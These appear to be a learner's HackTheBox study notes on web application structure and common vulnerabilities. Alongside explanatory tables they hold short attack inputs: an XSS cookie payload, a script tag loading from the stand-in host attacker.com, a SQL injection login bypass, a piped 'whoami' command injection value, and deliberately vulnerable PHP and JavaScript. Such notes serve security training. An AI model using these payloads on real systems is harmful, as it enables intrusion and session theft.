# Module 02 — Introduction to Web Applications

![Status](https://img.shields.io/badge/Status-Complete-brightgreen)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-red)
![Category](https://img.shields.io/badge/Category-General-blue)

## Sections Progress
- [x] Introduction
- [x] Web Application Layout
- [x] Front End vs Back End
- [x] HTML
- [x] CSS
- [x] JavaScript
- [x] Sensitive Data Exposure
- [x] HTML Injection
- [x] Cross-Site Scripting XSS
- [x] Cross-Site Request Forgery CSRF
- [x] Back End Servers
- [x] Web Servers
- [x] Databases
- [x] Development Frameworks and APIs
- [x] Common Web Vulnerabilities
- [x] Public Vulnerabilities

---

## What This Module Is About
Understanding how web applications are built, how they differ from
static websites, and why they are such a massive attack surface.
Before you attack something you need to understand what it is.

---

## Web App vs Static Website

| | Static Website | Web Application |
|-|---------------|-----------------|
| Content | Same for everyone | Dynamic per user |
| Updates | Manual by developer | Real-time |
| Generation | Web 1.0 | Web 2.0 |
| Functionality | None | Full |

---

## Why Web Apps Are a Massive Attack Surface
- Accessible by anyone with a browser worldwide
- Constantly changing — a single code change can introduce a critical vuln
- Linked to databases containing sensitive user and corporate data
- Automated tools make scanning and attacking easier than ever
- Dynamic nature means they are constantly overlooked during security reviews

---

## Real World Attack Examples

| Vulnerability | Real World Impact |
|---------------|------------------|
| SQL Injection | Extract AD usernames → password spray VPN/email portal |
| File Inclusion | Read source code → find hidden pages → RCE |
| File Upload | Upload malicious file as profile picture → full server control |
| IDOR | Change `/user/701/edit` to `/user/702/edit` → access another user |
| Broken Access Control | Register with `roleid=0` in POST body → instant admin account |
| Command Injection | Unsafe OS calls → execute commands on the server |

---

## Web Application Layout

| Category | Description |
|----------|-------------|
| Infrastructure | Database, servers, hosting setup |
| Components | UI/UX, Client, Server parts |
| Architecture | Relationships between all components |

### Infrastructure Models

| Model | Security Level | Notes |
|-------|---------------|-------|
| One Server | Worst | Everything together — one breach = total loss |
| Client-Server | Standard | Front end in browser, back end on server |
| Many Servers — One DB | Better | Server breach does not take down DB |
| Many Servers — Many DBs | Best | Full segmentation, redundancy, proper access control |

### Three Tier Architecture

| Layer | What It Does |
|-------|-------------|
| Presentation | HTML, CSS, JS — what user sees in browser |
| Application | Processes requests, checks auth and privileges |
| Data | Stores and retrieves data for the application |

### Microservices
App broken into independent components each doing one job —
payments, search, ratings etc. Stateless between them.
Can be written in different languages and still interact.

### Serverless
Runs in cloud containers like Docker on AWS, GCP, Azure.
No server management needed — cloud provider handles everything.

---

## Front End vs Back End

### Front End
Runs in the browser. Everything the user sees and interacts with.

| Technology | Role |
|-----------|------|
| HTML | Structure and content |
| CSS | Design and styling |
| JavaScript | Functionality and interaction |

### Back End
Runs on the server. Everything the user never sees.

| Component | Examples |
|-----------|---------|
| Servers | Linux, Windows, Docker |
| Web Servers | Apache, NGINX, IIS |
| Databases | MySQL, PostgreSQL, MongoDB |
| Frameworks | Laravel, Django, Spring, ASP.NET |

### Security Angle
- Front end = Whitebox — source code readable directly in browser
- Back end = Blackbox — hidden on server by default
- LFI can leak back end source → turns blackbox into whitebox

---

## OWASP Top 10

| # | Vulnerability |
|---|--------------|
| 1 | Broken Access Control |
| 2 | Cryptographic Failures |
| 3 | Injection |
| 4 | Insecure Design |
| 5 | Security Misconfiguration |
| 6 | Vulnerable and Outdated Components |
| 7 | Identification and Authentication Failures |
| 8 | Software and Data Integrity Failures |
| 9 | Security Logging and Monitoring Failures |
| 10 | Server-Side Request Forgery (SSRF) |

---

## Top Developer Mistakes — Pentester's Checklist

| # | Mistake | Why It Matters |
|---|---------|---------------|
| 1 | Invalid data into database | SQLi entry point |
| 5 | Plain text password storage | Full cred dump on DB breach |
| 7 | Unencrypted data in DB | Data exposed on breach |
| 8 | Client side validation only | Bypass with Burp, test directly |
| 10 | Variables via URL path | Parameter tampering, IDOR |
| 13 | Unverified SQL injections | Auth bypass, data exfil |
| 14 | Remote file inclusions | RCE via crafted file path |

---

## HTML

Skeleton of every web page. Browser reads and renders it visually.

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

| Element | Purpose |
|---------|---------|
| `<head>` | Invisible — holds title, CSS, JS references |
| `<body>` | Everything the user sees |
| `<style>` | CSS lives here |
| `<script>` | JavaScript lives here |

### URL Encoding

| Character | Encoded |
|-----------|---------|
| space | %20 |
| `'` | %27 |
| `"` | %22 |
| `#` | %23 |
| `&` | %26 |

Pentesting relevance — SQLi and XSS payloads often need URL
encoding to bypass filters or get correctly parsed by the server.

### DOM — Document Object Model
Every HTML element is a node in the DOM tree. JavaScript can
read, modify, or create any element via the DOM.
XSS injects JS that manipulates the DOM to steal cookies,
redirect users, or modify page content silently.

---

## CSS — Cascading Style Sheets

Defines how HTML elements look — colors, fonts, sizes, layout.

```css
body { background-color: black; }
h1 { color: white; text-align: center; }
p { font-family: helvetica; font-size: 10px; }
```

- Targets elements by tag, ID, or class name
- Combined with JS for dynamic real-time style changes
- Frameworks: Bootstrap, SASS, Foundation, Bulma, Pure

---

## JavaScript

Controls all front end functionality. Without it a page is static.

```html
<script type="text/javascript">
  document.getElementById("button1").innerHTML = "Changed Text!";
</script>
<script src="./script.js"></script>
```

### What JavaScript Does
- Updates page content in real-time without reloading
- Sends and receives data from back end via Ajax
- Runs entirely in browser — no server round trip needed

### Pentesting Relevance
- JS files often contain API endpoints, hidden parameters,
  hardcoded secrets — always check all loaded JS files
- Ajax requests expose back end endpoints not visible in the UI
- DOM-based XSS runs in victim browser without touching server
- Obfuscated JS is common — covered in Module 06

---

## Sensitive Data Exposure

Front end code runs client side — anyone can read it.
Developers often leave sensitive information in page source.

### What to Look For
- Hardcoded credentials in HTML comments
- Hidden links and directories
- Debug parameters left behind
- API keys or tokens in JS files
- Test pages never removed from production

### How to View Page Source
```
Right click → View Page Source
Ctrl + U
Burp Suite — works even if right click is disabled
```

### Real Example
```html
<!-- TODO: remove test credentials test:test -->
```
Credentials in an HTML comment — visible to anyone.
Used Ctrl + U on the login page, found it immediately.
Logged in with test:test — credentials still valid.

---

## HTML Injection

Unfiltered user input rendered as HTML by the browser.
Input is not treated as text — it executes as markup.

### Vulnerable Code
```html
<script>
  function inputFunction() {
    var input = prompt("Please enter your name", "");
    if (input != null) {
      document.getElementById("output").innerHTML = "Your name is " + input;
    }
  }
</script>
```

innerHTML renders raw input as HTML — zero sanitization.

### Test Payload
```html
<style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
```
Injected as name input — page background changed instantly.
Confirmed HTML is rendering not escaping user input.

### Real Impact
- Inject fake login forms to steal credentials
- Deface web pages — serious reputational damage
- Gateway to XSS — if HTML renders, JS likely renders too

---

## Cross-Site Scripting (XSS)

HTML Injection that executes JavaScript in the victim's browser.

### Three Types

| Type | How It Triggers |
|------|----------------|
| Reflected | Input returned in response — search results, errors |
| Stored | Saved to DB — executes for every visitor |
| DOM | Written directly to DOM — no server involved |

### Test Payload
```javascript
#"><img src=/ onerror=alert(document.cookie)>
```
Alert popped with session cookie. Ran entirely in browser —
no server interaction needed.

### Real Impact
- Steal session cookies → log in as victim without password
- Target admins → escalate to back end access
- Redirect users to phishing pages
- Keylog everything typed on the page

---

## Cross-Site Request Forgery (CSRF)

Tricks authenticated user's browser into making attacker's
request using the victim's active session.

### Attack Flow
1. Victim is logged in with valid session cookie
2. Victim views attacker content — comment, link, page
3. Attacker JS fires using victim's browser and session
4. Request hits target app authenticated as the victim

### Common Payload
```html
"><script src=//attacker.com/exploit.js></script>
```
exploit.js changes victim's password → attacker logs in.

### Prevention
- Anti-CSRF tokens per session or request
- SameSite=Strict cookie attribute
- Require password confirmation before sensitive changes
- WAF as additional layer — not a primary defense

### Sanitization vs Validation

| Control | What It Does |
|---------|-------------|
| Sanitization | Strips special characters before storing or displaying |
| Validation | Ensures input matches expected format |

Apply both on front end AND back end. One layer is not enough.

---

## Back End Servers

Hardware and OS hosting everything the web app needs.
All processing happens here — users never see it.

### Common Back End Stacks

| Stack | Components |
|-------|-----------|
| LAMP | Linux, Apache, MySQL, PHP |
| WAMP | Windows, Apache, MySQL, PHP |
| WINS | Windows, IIS, .NET, SQL Server |
| MAMP | macOS, Apache, MySQL, PHP |
| XAMPP | Cross-Platform, Apache, MySQL, PHP/PERL |

### Pentesting Relevance
- Stack identification → know exactly what vulns to test
- LAMP → PHP vulns, MySQL injection, .htaccess misconfig
- WINS → ASP.NET vulns, Active Directory attack paths
- WAF present → research bypass techniques before testing
- Docker containers → compromise one, pivot to others

---

## Web Servers

Handles all HTTP traffic. Routes requests, returns responses.
Runs on port 80 (HTTP) or 443 (HTTPS).

### HTTP Response Codes

| Code | Meaning | Pentesting Use |
|------|---------|---------------|
| 200 | OK | Page exists — keep enumerating |
| 301 | Moved Permanently | Note new URL |
| 302 | Temporary Redirect | Check where it goes after login |
| 400 | Bad Request | Useful for fuzzing |
| 401 | Unauthorized | Try default credentials |
| 403 | Forbidden | Page EXISTS — attempt bypass |
| 404 | Not Found | Page does not exist |
| 405 | Method Not Allowed | Try other HTTP methods |
| 500 | Internal Server Error | Possible injection point |
| 502 | Bad Gateway | Note the stack behind it |

403 means the page EXISTS — not that it is unreachable.
Always try bypass before moving on.

### Fingerprint the Server
```bash
curl -I https://target.com
```
Server version in headers → search for public CVEs immediately.

### Web Server Comparison

| Server | Share | Notes |
|--------|-------|-------|
| Apache | ~40% | PHP apps, open source, most common |
| NGINX | ~30% | High traffic, async, top 100k sites |
| IIS | ~15% | Windows, .NET, Active Directory auth |

### Pentesting Relevance
- Apache → PHP vulns, .htaccess misconfigurations
- NGINX → misconfigured proxy settings
- IIS → assume Active Directory is present, test AD paths
- 500 during fuzzing = you hit something — investigate
- Version in headers = direct path to known CVEs

---

## Databases

Web apps use databases to store assets, content, and user data.

### Relational (SQL)
Tables, rows, columns, defined relationships via Schema.
Fast and reliable for large structured datasets.

| Database | Notes |
|----------|-------|
| MySQL | Most common, open source, free |
| MSSQL | Microsoft, pairs with IIS and Windows Server |
| Oracle | Enterprise grade, expensive, very reliable |
| PostgreSQL | Open source, highly extensible |

### Non-Relational (NoSQL)
No tables or schemas. Flexible and scalable.

| Database | Notes |
|----------|-------|
| MongoDB | Most common NoSQL, document-based, free |
| ElasticSearch | Fast search on huge datasets |
| Apache Cassandra | Scalable, handles faults gracefully |

### Vulnerable Database Code
```php
$searchInput = $_POST['findUser'];
$query = "select * from users where name like '%$searchInput%'";
```
User input directly in query — no sanitization — classic SQLi.

### Pentesting Relevance
- MySQL + PHP = test every input for SQLi
- MSSQL = xp_cmdshell may be enabled → OS command execution
- MongoDB = test for NoSQL injection
- ElasticSearch = often exposed without auth internally
- Any raw user input in a query = injection point

---

## Development Frameworks and APIs

### Web Frameworks

| Framework | Language | Used By |
|-----------|----------|---------|
| Laravel | PHP | Startups, smaller companies |
| Express | Node.JS | PayPal, Uber, IBM, Yahoo |
| Django | Python | Google, YouTube, Instagram |
| Rails | Ruby | GitHub, Twitch, Airbnb |

Framework identification → known CVEs and predictable structure.

### Query Parameters
```
GET  → /search.php?item=apples
POST → /search.php  body: item=apples
```
Every parameter is a potential injection point.

### SOAP vs REST

| | SOAP | REST |
|-|------|------|
| Format | XML | JSON |
| Structure | Strict, verbose | Flexible, lightweight |
| Use Case | Complex data, stateful | Search, filter, CRUD |

### REST HTTP Methods

| Method | Action |
|--------|--------|
| GET | Retrieve data |
| POST | Create new data |
| PUT | Create or replace existing |
| DELETE | Remove data |

### Pentesting Relevance
- Framework version in headers → search CVEs
- REST endpoints in JS files → hidden untested API surface
- Test all four HTTP methods — PUT and DELETE often unrestricted
- SOAP errors leak internal structure and stack details
- API endpoints bypass UI validation — test directly with Burp

---

## Common Web Vulnerabilities

### Broken Authentication and Access Control

| Vulnerability | What It Means |
|---------------|--------------|
| Broken Authentication | Bypass login without valid credentials |
| Broken Access Control | Access pages or features without permission |

Real example — College Management System 1.2:
Email field: `' or 0=0 #` with any password
SQLi in login form → authenticated without an account.

### Malicious File Upload
App accepts uploads without validating file type.
Upload PHP shell disguised as image → RCE on server.

Real example — WordPress Responsive Thumbnail Slider 1.0:
Double extension bypass: `shell.php.jpg` uploaded successfully.
Metasploit module exists for this exact vulnerability.

### Command Injection
App passes user input directly into an OS command.
Attacker appends their own command using `|` or `;`.

Real example — WordPress Plainview Activity Monitor 20161228:
ip value: `127.0.0.1 | whoami`
Injected command ran alongside original — full OS access.

### SQL Injection
User input goes directly into SQL query without sanitization.

```php
$query = "select * from users where name like '%$searchInput%'";
```

College Management System 1.2 — SQLi on login.
Query always returns true → authenticated, data extracted.

### Pentesting Relevance
- Test every login form for auth bypass first
- Every file upload — try double extension and null byte bypass
- Every field triggering a system action — test command injection
- Every search and filter field — test for SQLi
- Misconfigs cause these vulns even in fully patched public apps

---

## Public Vulnerabilities

### Where to Search

| Resource | URL |
|----------|-----|
| Exploit DB | exploit-db.com |
| Rapid7 DB | rapid7.com/db |
| Vulnerability Lab | vulnerability-lab.com |
| NVD | nvd.nist.gov |

### Attack Workflow
1. Identify app and version — source, version.php, headers, errors
2. Search Google: `[app name] [version] exploit`
3. Check exploit databases for public CVEs
4. Prioritize CVSS 8-10 or RCE leading exploits
5. Check plugins and components separately — own CVEs

### CVSS Scoring

| Version | Severity | Score |
|---------|----------|-------|
| V2 | Low | 0.0 – 3.9 |
| V2 | Medium | 4.0 – 6.9 |
| V2 | High | 7.0 – 10.0 |
| V3 | None | 0.0 |
| V3 | Low | 0.1 – 3.9 |
| V3 | Medium | 4.0 – 6.9 |
| V3 | High | 7.0 – 8.9 |
| V3 | Critical | 9.0 – 10.0 |

V3 added Critical as separate tier — V2 capped at High.
Always note which version a score is reported in.

### Back End Component Vulnerabilities
- Web server vulns = highest priority — directly exposed externally
- ShellShock — Apache pre-2014, RCE via HTTP headers
- DB and OS vulns = exploited after initial access
- Used to escalate privileges or pivot to internal servers

### Pentesting Relevance
- Version identification is step one on every engagement
- Known CVE on unpatched app = direct path to RCE
- Always check third party plugins — often the weak link
- Use V3 CVSS for report severity ratings
- Adjust with Temporal and Environmental for client reports

---

## Key Takeaways
- Web apps are dynamic, platform-independent, always changing
- Three tier architecture — Presentation, Application, Data
- Front end is whitebox — back end is blackbox by default
- HTML structures, CSS styles, JavaScript controls behavior
- DOM is the primary attack surface for XSS
- URL encoding used in payloads to bypass filters
- Page source is always the first thing to check on a target
- HTML Injection proves the door is open for JavaScript injection
- XSS steals sessions — CSRF weaponizes those sessions
- Sanitize and validate on both front end and back end
- Stack identification shapes your entire attack strategy
- 403 means the resource exists — never stop there
- Version in headers = direct path to known CVEs
- OWASP Top 10 is the foundation of everything in this path